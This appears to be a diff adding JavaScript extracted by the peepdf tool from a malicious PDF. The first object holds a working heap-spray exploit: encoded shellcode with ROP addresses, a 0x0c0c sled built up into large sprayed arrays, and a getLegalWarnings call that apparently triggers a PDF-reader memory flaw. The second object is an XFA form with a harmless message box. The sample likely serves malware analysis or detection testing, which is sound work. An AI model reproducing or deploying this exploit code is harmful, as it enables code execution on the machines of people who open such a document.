@@ -1,0 +1,23 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+// comment
+var shellcode = unescape("%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%uc3da%u16ba%u3178%ud9e4%u2474%u5ef4%uc933%u3bb1%uee83%u31fc%u1556%u5603%uf415%ucd8d%u7a0c%u2e6d%u1acd%ucbe7%u1afc%u9893%uaaaf%ucdd7%u4143%ue5b5%u27d0%u0912%u8d50%u2444%ubd61%u27b5%ubfe1%u87e9%u70d8%uc6fc%u6c1d%u9a0d%ufbf6%u0ba0%ub172%ua778%u54c8%u54f9%u5798%ucb28%u0e92%uedea%u3b77%uf5a3%u0194%u8d7d%ufe6f%u477c%uffbe%ua6d3%uf20e%uee2a%ueca9%u0658%u91ca%udd5a%u4db0%uc6ee%u0613%u2348%ucba5%ua00f%ua0a9%uee44%u37ad%u8488%ubcca%u4b2f%u865b%u4f0b%u5d07%ud635%u30ed%u084a%ued4e%u42ee%ufa63%u0882%ufdee%u3711%ufd5c%u3829%u95f1%ub318%ue29e%u16a4%u1cdb%u3bef%ub44a%ua9b6%ud9ce%u0448%ue70c%uadca%u1ced%uc7d2%u59e8%u3b54%uf281%u3b31%uf336%u4b13%u7cd7%udef9%uea54%u7364%uc4f7%uf303%u3862%u669f%u1519%u065c%u118f%ub607%uf93b%u03e3%u8faa%udfd1%u3f7f%u937a%ucd1c%u23eb%u1f97%ubb98%u7f23%u5528%u41cc");
+var c = unescape("%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c");
+while (c.length + 20 + 8 < 0x10000) c += c;
+b = c.substring(0, (0x0c0c - 0x24) / 2);
+b += shellcode;
+b += c;
+d = b.substring(0, 0x10000 / 2);
+while (d.length < 0x80000) d += d;
+var_3 = d.substring(0, 0x80000 - (0x1020 - 0x08) / 2);
+var var_4 = new Array();
+for (i = 0; i < 0x1f0; i++) var_4[i] = var_3 + "s";
+this.getLegalWarnings(true);
+
+// peepdf comment: Javascript code located in object 9 (version 0)
+
+<? xml version = '1.0' ?> < xdp: xdp xmlns: xdp = 'http://ns.adobe.com/xdp/' > < config xmlns: xfa = 'http://www.xfa.org/schema/xci/3.0/' > < present > < pdf > < interactive > 1 < /interactive></pdf > < /present></config > < template xmlns: xfa = 'http://www.xfa.org/schema/xfa-template/3.0/' > < subform layout = 'tb'
+name = 'form1' > < pageSet / > < event activity = 'initialize'
+name = 'event__ready' > < script contentType = 'application/x-formcalc' > < /script></event > < subform > < field name = 'Button1' > < ui > < button highlight = 'inverted' / > < /ui><caption><value><text>Send!</text > < /value><para hAlign='center' vAlign='middle'/ > < /caption><bind match='none'/ > < event activity = 'click'
+name = 'event__click' > < script contentType = 'application/x-formcalc' > < /script></event > < /field><field name='TextField1'><ui><textEdit><border><edge stroke='lowered'/ > < /border></textEdit > < /ui></field > < /subform></subform > < /template><xfa:datasets xmlns:xfa='http:/ / www.xfa.org / schema / xfa - data / 1.0 / '><xfa:data><form1><TextField1>$host.messageBox("Greetings from Mars!")</TextField1></form1></xfa:data></xfa:datasets></xdp:xdp>
+
